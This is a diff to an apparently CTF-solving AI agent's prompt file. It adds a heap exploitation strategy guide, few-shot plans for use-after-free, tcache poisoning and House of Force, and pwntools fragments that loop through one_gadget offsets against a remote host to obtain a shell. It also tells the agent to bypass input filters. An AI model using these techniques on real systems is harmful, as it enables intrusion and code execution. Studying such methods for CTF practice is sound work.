@@ -542,6 +542,80 @@ class CTFSolvePrompt:
     - If any value (offset/addr/key/…) is unknown, first add a PREP step to derive it deterministically and write it to an artifact.
       Then write 'script_py' that LOADS those values from the produced artifacts at runtime.
 
+    ### CRITICAL: DECOMPILED CODE VERIFICATION ###
+    Before writing ANY exploit code, you MUST verify these from the ACTUAL decompiled/source code:
+
+    1. **FUNCTION INTERFACE VERIFICATION**
+       - What EXACT inputs does each function expect?
+       - Match scanf/read format specifiers to your send* calls
+       - Example: if source shows `scanf("%d", &weight); scanf("%ld", &age);`
+         → Your code must be: `p.sendlineafter(b'Weight: ', str(weight).encode())`
+         → NOT: `p.sendafter(b'Name:', name)` if there's no Name input!
+
+    2. **CONDITIONAL CONSTRAINTS**
+       - Check ALL if/else conditions that gate functionality
+       - Example: `if (size >= 0x100) { malloc(size); }` means size MUST be >= 256
+       - Example: `if (idx < 10)` with unsigned idx means -1 = 0xFFFFFFFF > 10, so condition fails
+
+    3. **FUNCTION FLOW ANALYSIS**
+       - Map the EXACT sequence: menu → input → allocation → operation → free
+       - Don't assume separate alloc/free functions if source shows one combined function
+
+    4. **STRUCT LAYOUT CALCULATION**
+       ```c
+       struct Example { char buf[16]; int x; long y; };
+       // buf: offset 0-15, x: offset 16-19, padding: 20-23, y: offset 24-31
+       ```
+       - Calculate offsets INCLUDING padding for alignment
+
+    5. **HELPER FUNCTION SIGNATURES**
+       Your helper functions MUST exactly match the target's interface:
+       ```python
+       # WRONG (assuming Name input exists):
+       def human(name, weight, age):
+           p.sendafter(b'Name:', name)  # This will hang if no Name prompt!
+
+       # CORRECT (matching actual source):
+       def human(weight, age):
+           p.sendlineafter(b'Weight: ', str(weight).encode())
+           p.sendlineafter(b'Age: ', str(age).encode())
+       ```
+
+    ### HEAP EXPLOITATION CHECKLIST (if malloc/free detected) ###
+    Before generating heap exploit code, verify from decompiled/source code:
+
+    1. **SIZE CONSTRAINTS**: Extract exact min/max from if statements
+       - Look for: `if (size >= N)`, `if (size <= M)`, `if (size > X)`
+       - This determines which bins are available (tcache/fastbin/unsorted/large)
+       - Unsorted bin requires size > 0x408 (1032 bytes)
+
+    2. **INDEX VALIDATION**: Check signed vs unsigned comparison
+       - `scanf("%d", &idx)` reads signed → negative values possible
+       - `if (idx < N)` may allow negative bypass depending on variable type
+       - Analyze what happens with out-of-bounds index values
+
+    3. **FUNCTION FLOW**: Map exact sequence from source
+       - Is alloc/free combined in one function or separate?
+       - What inputs are required? (scanf formats, read sizes)
+       - What outputs are produced? (printf formats for leaks)
+       - Your helper functions MUST match this exact flow
+
+    4. **LEAK STRATEGY**: Choose based on available chunk sizes
+       - Large chunk (>0x408): unsorted bin leak (fd/bk → main_arena)
+       - Small chunk: tcache/fastbin leak (heap addresses only)
+       - Barrier chunk needed to prevent top chunk consolidation
+
+    5. **STRUCT LAYOUT**: Calculate offsets with padding
+       - Different struct types may share same malloc size
+       - Fields at same offset can be exploited via UAF
+       - Account for alignment padding between fields
+
+    6. **ONE_GADGET STRATEGY**: Always try ALL offsets
+       - one_gadget tool returns multiple offsets with different constraints
+       - Each has conditions like [rsp+0x70]==NULL, rax==NULL, etc.
+       - NEVER hardcode single offset - implement loop to try all
+       - Fallback: system("/bin/sh") or __free_hook+system
+
     ### CRITICAL: FILTER/WAF BYPASS REQUIREMENTS ###
     - If the target has input filters (XSS, SQLi, command injection filters), you MUST bypass them
     - ### CRITICAL: Filter scope includes ALL identifiers (names) AND values ###
@@ -1217,3 +1291,573 @@ class few_Shot:
     }
   ]
 }"""
+
+    # ==================== HEAP EXPLOITATION FEW-SHOTS ====================
+
+    pwn_heap_uaf = """{
+  "candidates": [
+    {
+      "vuln": "Use-After-Free (UAF)",
+      "why": "malloc/free pattern detected; freed chunk reused without clearing; dangling pointer dereference",
+      "cot_now": "First, identify all allocation/free functions and their chunk sizes. Analyze the menu-driven structure to understand allocation order. Key: find two different object types that share the same chunk size - freeing one and allocating another allows type confusion. Check if function pointers or vtables exist in structures.",
+      "tasks": [
+        {
+          "name": "identify_heap_funcs",
+          "cmd": "ghidra_decompile(binary_path='./vuln', function_name='main')",
+          "success": "re:malloc|free|calloc|realloc",
+          "artifact": "main_decomp.c"
+        },
+        {
+          "name": "analyze_struct_sizes",
+          "cmd": "ghidra_decompile(binary_path='./vuln', function_name='create_object')",
+          "success": "re:malloc\\(0x|sizeof",
+          "artifact": "struct_analysis.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "other", "name": "chunk_size", "hint": "Allocation sizes: 0x20, 0x30, etc."},
+        {"type": "other", "name": "uaf_primitive", "hint": "Free without NULL assignment, reuse pattern"},
+        {"type": "symbol", "name": "func_ptr_offset", "hint": "Function pointer location in struct"}
+      ]
+    }
+  ]
+}"""
+
+    pwn_heap_tcache = """{
+  "candidates": [
+    {
+      "vuln": "Tcache Poisoning",
+      "why": "glibc 2.26+; tcache fd pointer can be overwritten after free to get arbitrary allocation",
+      "cot_now": "Tcache (per-thread cache) has minimal security checks. After freeing a chunk, if we can overwrite its fd pointer, the next malloc of same size returns our target address. Strategy: 1) Allocate and free chunk to put in tcache, 2) Overwrite fd via UAF/overflow, 3) Allocate twice to get arbitrary write primitive.",
+      "tasks": [
+        {
+          "name": "check_libc_version",
+          "cmd": "strings_extract(binary_path='./libc.so.6')",
+          "success": "re:GLIBC_2\\.(2[6-9]|3[0-9])",
+          "artifact": "libc_version.txt"
+        },
+        {
+          "name": "find_tcache_target",
+          "cmd": "readelf_info(binary_path='./vuln', info_type='symbols')",
+          "success": "re:__free_hook|__malloc_hook|got",
+          "artifact": "symbols.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "other", "name": "libc_version", "hint": "glibc version for tcache behavior"},
+        {"type": "symbol", "name": "hook_addr", "hint": "__free_hook or __malloc_hook address"},
+        {"type": "leak", "name": "heap_base", "hint": "Heap address for tcache struct location"}
+      ]
+    }
+  ]
+}"""
+
+    pwn_heap_unsorted_bin = """{
+  "candidates": [
+    {
+      "vuln": "Unsorted Bin Attack / Libc Leak",
+      "why": "Large chunk (>0x408) freed goes to unsorted bin; fd/bk points to main_arena in libc",
+      "cot_now": "Unsorted bin chunks have fd/bk pointing to main_arena (libc). Strategy for leak: 1) Allocate chunk > 0x408 (avoid tcache), 2) Allocate another chunk to prevent top chunk consolidation, 3) Free first chunk → goes to unsorted bin, 4) Reallocate or read freed chunk to leak libc. The fd/bk will contain main_arena+offset.",
+      "tasks": [
+        {
+          "name": "find_alloc_constraints",
+          "cmd": "ghidra_decompile(binary_path='./vuln', function_name='alloc_func')",
+          "success": "re:size.*0x|malloc\\(",
+          "artifact": "alloc_decomp.c"
+        },
+        {
+          "name": "check_size_limits",
+          "cmd": "objdump_disassemble(binary_path='./vuln', function_name='alloc_func')",
+          "success": "re:cmp.*0x|size check",
+          "artifact": "size_check.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "other", "name": "size_constraint", "hint": "Min/max allocation size limits (need >= 0x410)"},
+        {"type": "leak", "name": "libc_leak", "hint": "main_arena pointer from unsorted bin"},
+        {"type": "offset", "name": "main_arena_offset", "hint": "Offset from leak to libc base"}
+      ]
+    }
+  ]
+}"""
+
+    pwn_heap_double_free = """{
+  "candidates": [
+    {
+      "vuln": "Double Free",
+      "why": "Same chunk freed twice; leads to tcache/fastbin corruption for arbitrary allocation",
+      "cot_now": "Double free corrupts the free list. In tcache: A→B→A creates a loop. malloc returns A, write fd, malloc returns B, malloc returns A again (now pointing to target). For glibc <2.29, tcache has no double-free check. For newer glibc, need to bypass with key field manipulation or use fastbin instead.",
+      "tasks": [
+        {
+          "name": "identify_free_calls",
+          "cmd": "ghidra_decompile(binary_path='./vuln', function_name='delete_func')",
+          "success": "re:free\\(",
+          "artifact": "delete_decomp.c"
+        },
+        {
+          "name": "check_double_free_protection",
+          "cmd": "gdb_debug(binary_path='./vuln', command='heap bins')",
+          "success": "re:tcache|fastbin",
+          "artifact": "heap_state.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "other", "name": "no_null_check", "hint": "Pointer not NULLed after free"},
+        {"type": "other", "name": "double_free_primitive", "hint": "Can free same chunk twice"},
+        {"type": "leak", "name": "heap_addr", "hint": "Heap address for fd calculation"}
+      ]
+    }
+  ]
+}"""
+
+    pwn_heap_overflow = """{
+  "candidates": [
+    {
+      "vuln": "Heap Buffer Overflow",
+      "why": "Write beyond allocated chunk corrupts adjacent chunk metadata or data",
+      "cot_now": "Heap overflow can corrupt: 1) Next chunk's header (size field) for chunk overlapping, 2) Next chunk's data (function pointers, etc.), 3) Free list pointers if next chunk is freed. Strategy: Calculate exact offset to target, understand chunk layout with headers (prev_size, size, fd, bk).",
+      "tasks": [
+        {
+          "name": "find_overflow_source",
+          "cmd": "ghidra_decompile(binary_path='./vuln', function_name='edit_func')",
+          "success": "re:read\\(|gets\\(|strcpy\\(|memcpy\\(",
+          "artifact": "edit_decomp.c"
+        },
+        {
+          "name": "calculate_chunk_layout",
+          "cmd": "gdb_debug(binary_path='./vuln', command='x/20gx <heap_addr>')",
+          "success": "re:0x[0-9a-f]+",
+          "artifact": "heap_layout.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "offset", "name": "overflow_offset", "hint": "Bytes to reach next chunk header"},
+        {"type": "other", "name": "overflow_size", "hint": "How many bytes we can overflow"},
+        {"type": "other", "name": "target_in_adjacent", "hint": "What's in the next chunk (func ptr, etc.)"}
+      ]
+    }
+  ]
+}"""
+
+    pwn_heap_house_of_force = """{
+  "candidates": [
+    {
+      "vuln": "House of Force",
+      "why": "Top chunk size can be overwritten to -1; next malloc of calculated size returns arbitrary address",
+      "cot_now": "House of Force exploits top chunk manipulation. Steps: 1) Overflow to corrupt top chunk size to 0xffffffffffffffff, 2) Calculate distance: target_addr - top_chunk_addr - 0x20, 3) malloc(distance) consumes top chunk up to target, 4) Next malloc returns target address. Requires: heap overflow reaching top chunk, known heap address.",
+      "tasks": [
+        {
+          "name": "find_top_chunk_overflow",
+          "cmd": "gdb_debug(binary_path='./vuln', command='heap top')",
+          "success": "re:Top chunk|top:",
+          "artifact": "top_chunk.txt"
+        },
+        {
+          "name": "calculate_distance",
+          "cmd": "readelf_info(binary_path='./vuln', info_type='sections')",
+          "success": "re:\\.got|__free_hook",
+          "artifact": "target_sections.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "leak", "name": "heap_base", "hint": "Heap base for top chunk location"},
+        {"type": "leak", "name": "target_addr", "hint": "Target address (__free_hook, GOT, etc.)"},
+        {"type": "offset", "name": "overflow_to_top", "hint": "Bytes from current chunk to top chunk size"}
+      ]
+    }
+  ]
+}"""
+
+    pwn_heap_fastbin_dup = """{
+  "candidates": [
+    {
+      "vuln": "Fastbin Dup",
+      "why": "Fastbin double free with size check bypass; for older glibc without tcache",
+      "cot_now": "Fastbin has simple double-free check (head != chunk). Bypass: free(A), free(B), free(A) creates A→B→A. Then malloc+write fd, malloc, malloc gets arbitrary address. Size: must be 0x20-0x80 range. Fake chunk at target needs valid size field matching fastbin index.",
+      "tasks": [
+        {
+          "name": "verify_fastbin_range",
+          "cmd": "ghidra_decompile(binary_path='./vuln', function_name='alloc_func')",
+          "success": "re:malloc\\(0x[2-7]|size.*\\b(32|48|64|80|96|112|128)\\b",
+          "artifact": "size_check.c"
+        },
+        {
+          "name": "find_fake_chunk_location",
+          "cmd": "objdump_disassemble(binary_path='./vuln', function_name='main')",
+          "success": "re:0x[0-9a-f]+",
+          "artifact": "fake_chunk_candidates.txt"
+        }
+      ],
+      "expected_signals": [
+        {"type": "other", "name": "fastbin_size", "hint": "Chunk size in fastbin range"},
+        {"type": "symbol", "name": "fake_chunk_addr", "hint": "Address with valid fake size (e.g., __malloc_hook-0x23)"},
+        {"type": "other", "name": "alloc_count", "hint": "Number of allocations to drain fastbin"}
+      ]
+    }
+  ]
+}"""
+
+    # ==================== HEAP KNOWLEDGE BASE ====================
+
+    heap_exploitation_knowledge = """
+### HEAP EXPLOITATION STRATEGY GUIDE ###
+
+=== DECOMPILED CODE ANALYSIS CHECKLIST ===
+**CRITICAL: Before writing exploit, verify these from decompiled code:**
+
+1. **Size Constraints** - Look for if statements with size comparisons:
+   ```c
+   if (size >= 0x100) { malloc(size); }  // MINIMUM size required!
+   if (size > 0x1000) return;            // Maximum limit
+   ```
+   → This determines if unsorted bin (>0x408) is possible
+
+2. **Index Validation** - Check for signed/unsigned issues:
+   ```c
+   if (idx < 10) { free(arr[idx]); }     // NEGATIVE INDEX ALLOWED! Use -1
+   scanf("%d", &idx);                     // Signed int, can be negative
+   ```
+   → Use idx=-1 to skip free while still incrementing counter
+
+3. **Struct Layout** - Calculate exact offsets:
+   ```c
+   struct Human { char name[16]; int weight; long age; };
+   // name: 0-15, weight: 16-19, padding: 20-23, age: 24-31
+   // Total: 32 bytes (0x20)
+   ```
+   → Function pointer at same offset in different struct = UAF target
+
+4. **Print/Leak Functions** - How is data displayed:
+   ```c
+   printf("Data: %s\n", chunk);           // Leaks until null byte
+   write(1, chunk, size);                 // Leaks exact bytes
+   ```
+   → Determines leak reliability
+
+5. **Free Behavior** - Is pointer NULLed after free:
+   ```c
+   free(ptr);           // Pointer NOT nulled = UAF possible
+   free(ptr); ptr=NULL; // Pointer nulled = no UAF
+   ```
+
+=== CRITICAL ANALYSIS STEPS ===
+1. **Identify Heap Primitives**
+   - What operations exist? (alloc, free, edit, show/print)
+   - What are the chunk sizes? (affects which bin: tcache/fastbin/unsorted/large)
+   - Are there size constraints? (min/max limits, must be >= 0x100, etc.)
+   - Is there a chunk limit? (array bounds)
+
+2. **Determine Vulnerability Type**
+   - UAF: Free without NULL, dangling pointer access
+   - Double Free: Same chunk freed twice
+   - Heap Overflow: Write beyond chunk boundary
+   - Use-After-Write: Modify freed chunk content
+   - Off-by-one/null: Single byte overflow (usually null)
+
+3. **Libc Version Matters**
+   - glibc < 2.26: No tcache, fastbin attacks
+   - glibc 2.26-2.28: Tcache without protections
+   - glibc 2.29+: Tcache key (double-free check)
+   - glibc 2.32+: Safe-linking (pointer mangling)
+   - glibc 2.34+: __malloc_hook/__free_hook REMOVED
+
+=== LEAK STRATEGIES BY CHUNK SIZE ===
+| Size Range | Bin Type | Leak Method |
+|------------|----------|-------------|
+| 0x20-0x410 | Tcache | Tcache fd points to next free chunk (heap leak only) |
+| 0x20-0x80 | Fastbin | Similar to tcache (heap leak only) |
+| > 0x410 | Unsorted | fd/bk points to main_arena → LIBC LEAK |
+| > 0x410 | Large | fd_nextsize/bk_nextsize for heap leak |
+
+=== COMMON EXPLOIT PATTERNS ===
+
+**Pattern 1: UAF → Function Pointer Overwrite**
+```
+1. alloc(A) - contains function pointer at offset X
+2. free(A) - A goes to tcache/fastbin
+3. alloc(B) - same size, reuses A's memory
+4. write(B, offset=X, value=target_func)
+5. trigger A's function pointer → calls target_func
+```
+
+**Pattern 2: Unsorted Bin Libc Leak**
+```
+1. alloc(0x410+) - chunk A (large, avoids tcache)
+2. alloc(0x20) - chunk B (prevents top chunk merge with top)
+3. free(A) - goes to unsorted bin, fd/bk = main_arena
+4. alloc(0x410+) or show(A) - read fd/bk for libc leak
+5. libc_base = leaked_addr - main_arena_offset
+```
+**CRITICAL for unsorted bin leak:**
+- MUST have a chunk between target and top chunk (prevents consolidation)
+- If using index-based free: use idx=-1 to skip free on some allocations
+- Typical pattern with idx bypass:
+  ```python
+  custom(0x410, data, -1)  # alloc only, idx=-1 skips free
+  custom(0x410, data, -1)  # second chunk (top chunk barrier)
+  custom(0x410, data, 0)   # free first chunk → unsorted bin
+  custom(0x410, data, -1)  # realloc, read leaked libc pointer
+  ```
+
+**Pattern 3: Tcache Poisoning (arbitrary write)**
+```
+1. alloc(size), free → chunk in tcache
+2. UAF write: modify freed chunk's fd to target
+3. alloc(size) → returns original chunk
+4. alloc(size) → returns target address!
+5. write(target, value) → arbitrary write achieved
+```
+
+**Pattern 4: Double Free → Arbitrary Alloc**
+```
+1. alloc(A), alloc(B)
+2. free(A), free(B), free(A) → tcache: A→B→A
+3. alloc() → returns A, write fd=target
+4. alloc() → returns B
+5. alloc() → returns A (fd was modified)
+6. alloc() → returns target!
+```
+
+=== SIZE CONSTRAINT ANALYSIS ===
+CRITICAL: Always check allocation size constraints!
+```c
+if (size >= 0x100) { ... }  // Only allocates if size >= 256
+if (size > 0x1000) return;  // Max size limit
+if (size < 0x10) return;    // Min size limit
+```
+
+These constraints determine:
+- Whether you can use unsorted bin for libc leak
+- Whether tcache or fastbin applies
+- Attack surface limitations
+
+=== INDEX VALIDATION BYPASS ===
+Common vulnerable patterns:
+```c
+if (idx < 10) { free(arr[idx]); }  // Negative index bypass!
+if (idx <= 10) { ... }  // Off-by-one in array access
+scanf("%d", &idx);  // Signed vs unsigned mismatch
+```
+
+=== IMPORTANT OFFSETS ===
+Libc leak → libc_base calculation:
+- main_arena offset varies by libc version
+- Use: libc_base = leak - libc.symbols['__malloc_hook'] - 0x10
+- Or: libc_base = leak - 0x3ebca0 (example for libc-2.27)
+
+Common targets:
+- __free_hook (glibc < 2.34)
+- __malloc_hook (glibc < 2.34)
+- GOT entries
+- Return addresses (with stack leak)
+- vtables (C++ targets)
+
+=== ONE_GADGET USAGE (CRITICAL) ===
+**one_gadget returns MULTIPLE offsets with different constraints. Try ALL of them!**
+
+Each one_gadget has different register/memory constraints that may or may not be satisfied.
+NEVER use just one offset - always try all available offsets sequentially.
+
+✅ CORRECT: Try all one_gadget offsets
+```python
+# Common one_gadget offsets for libc-2.27 (example)
+ONE_GADGETS = [0x4f3d5, 0x4f432, 0x10a41c]
+
+# Method 1: Loop through all gadgets
+for gadget_offset in ONE_GADGETS:
+    try:
+        p = remote(host, port)
+        # ... setup leak ...
+        one_gadget = libc_base + gadget_offset
+        # ... trigger exploit ...
+        p.sendline(b'id')
+        if b'uid=' in p.recv(timeout=1):
+            log.success(f"Working gadget: {hex(gadget_offset)}")
+            p.interactive()
+            break
+    except:
+        p.close()
+        continue
+
+# Method 2: Use execve with /bin/sh if one_gadget fails
+# system_addr = libc_base + libc.symbols['system']
+# binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
+```
+
+❌ WRONG: Using only one offset
+```python
+one_gadget = libc_base + 0x4f3d5  # May fail due to constraints!
+```
+
+**one_gadget constraint examples:**
+- `[rsp+0x70] == NULL` - requires stack alignment
+- `rax == NULL` - requires rax to be zero
+- `[rsp+0x30] == NULL` - requires specific stack state
+
+If all one_gadgets fail, fallback to:
+1. system("/bin/sh") with controlled argument
+2. execve with ROP chain
+3. __free_hook + system (trigger via free)
+
+=== ❌ WRONG vs ✅ CORRECT PATTERNS ===
+**CRITICAL: Common LLM mistakes in heap exploitation and how to avoid them**
+
+### Mistake 1: Inventing function inputs that don't exist in source
+```c
+// If source code shows:
+void target_func() {
+    scanf("%d", &obj->field1);
+    scanf("%ld", &obj->field2);
+}
+```
+
+❌ WRONG: Adding parameters not in source
+```python
+def target(extra_param, field1, field2):
+    p.sendafter(b'Extra:', extra_param)  # ERROR: No such prompt!
+```
+
+✅ CORRECT: Match EXACTLY what source expects
+```python
+def target(field1, field2):
+    p.sendlineafter(b'field1: ', str(field1).encode())
+    p.sendlineafter(b'field2: ', str(field2).encode())
+```
+**Rule**: Count scanf/read calls in source → same number of send* calls
+
+### Mistake 2: Splitting combined functions into separate ones
+```c
+// If source shows ONE function with multiple operations:
+void menu_func() {
+    ptr = malloc(size);
+    read(0, ptr, size);
+    printf("%s\\n", ptr);
+    scanf("%d", &idx);
+    if (condition) free(arr[idx]);
+}
+```
+
+❌ WRONG: Creating separate alloc/free functions
+```python
+def alloc_chunk(size, data):
+    p.sendlineafter(b'Size: ', str(size).encode())
+    p.sendafter(b'Data: ', data)
+
+def free_chunk(idx):  # ERROR: This function doesn't exist separately!
+    p.sendlineafter(b'Idx: ', str(idx).encode())
+```
+
+✅ CORRECT: One helper matching one source function
+```python
+def menu_func(size, data, idx):
+    p.sendlineafter(b'Size: ', str(size).encode())
+    p.sendafter(b'Data: ', data)
+    p.sendlineafter(b'Idx: ', str(idx).encode())
+```
+**Rule**: One source function → One helper function
+
+### Mistake 3: Ignoring size constraints in conditionals
+```c
+// If source shows:
+if (size >= MIN_SIZE) {
+    ptr = malloc(size);
+}
+```
+
+❌ WRONG: Using arbitrary sizes
+```python
+alloc(32, data)   # If MIN_SIZE > 32, this does nothing!
+```
+
+✅ CORRECT: Respect the constraint
+```python
+alloc(MIN_SIZE, data)   # Use exactly the minimum or larger
+# For unsorted bin leak, use size > 0x408
+alloc(0x420, data)
+```
+**Rule**: Extract ALL if conditions with size checks
+
+### Mistake 4: Misunderstanding signed/unsigned index checks
+```c
+// If source shows:
+scanf("%d", &idx);              // Signed read
+if (idx < MAX && arr[idx]) {    // Comparison
+    free(arr[idx]);
+}
+```
+
+Analysis depends on variable types:
+- `int idx` with `idx < 10`: -1 passes first check but arr[-1] may crash
+- `unsigned idx` with `idx < 10`: -1 becomes large positive, fails check
+
+✅ CORRECT approach:
+1. Check variable type of idx in decompiled code
+2. Test boundary values (-1, 0, MAX-1, MAX, MAX+1)
+3. Understand what each value does (skip free, trigger free, crash)
+
+### Mistake 5: Forgetting alignment padding in structs
+```c
+struct Example {
+    char buf[16];   // 0-15
+    int x;          // 16-19
+    long y;         // 24-31 (NOT 20! Padding at 20-23 for 8-byte alignment)
+};
+```
+
+❌ WRONG: Assuming fields are contiguous
+```python
+payload = flat(b'A'*16, p32(val1), p64(val2))  # val2 at wrong offset
+```
+
+✅ CORRECT: Account for alignment
+```python
+payload = flat(b'A'*16, p32(val1), p32(0), p64(val2))  # Explicit padding
+# Or calculate: offset_y = (16 + 4 + 7) & ~7 = 24
+```
+**Rule**: 8-byte types align to 8-byte boundaries
+
+### Mistake 6: Unsorted bin leak without barrier chunk
+❌ WRONG: Free directly adjacent to top chunk
+```python
+alloc(0x420, data)  # Large chunk
+free(0)             # Merges with top chunk! No leak possible
+```
+
+✅ CORRECT: Barrier chunk prevents merge
+```python
+alloc(0x420, data)  # Chunk 0 (target)
+alloc(0x20, data)   # Chunk 1 (BARRIER)
+free(0)             # Chunk 0 → unsorted bin (not merged)
+alloc(0x420, data)  # Reuses chunk 0, read leaked fd/bk
+```
+**Rule**: Always allocate barrier before freeing to unsorted bin
+
+### Mistake 7: Incorrect leak data parsing
+```c
+printf("%s\\n", ptr);  // Prints until null, then newline
+```
+
+❌ WRONG: Raw receive without cleanup
+```python
+leak = u64(p.recv(8))  # May get newline, partial data, garbage
+```
+
+✅ CORRECT: Clean parsing
+```python
+p.recvuntil(b'prefix')
+data = p.recvline()[:-1]  # Strip newline
+# Skip any marker bytes you wrote
+leak = u64(data.ljust(8, b'\\x00'))  # Pad if < 8 bytes
+```
+**Rule**: Always handle newlines, null terminators, marker bytes
+
+=== SELF-CHECK BEFORE GENERATING EXPLOIT ===
+1. **Inputs**: Does my send* sequence match scanf/read sequence in source?
+2. **Functions**: Does each helper map to exactly one source function?
+3. **Sizes**: Did I extract and respect ALL size constraints?
+4. **Alignment**: Did I calculate struct offsets with padding?
+5. **Indexes**: What values skip/trigger operations? Test boundaries.
+6. **Leak**: Is there a barrier chunk? Am I parsing output correctly?
+7. **Libc**: What version? Are hooks available? Need one_gadget?
+8. **One_gadget**: Am I trying ALL offsets in a loop, not just one?
+"""
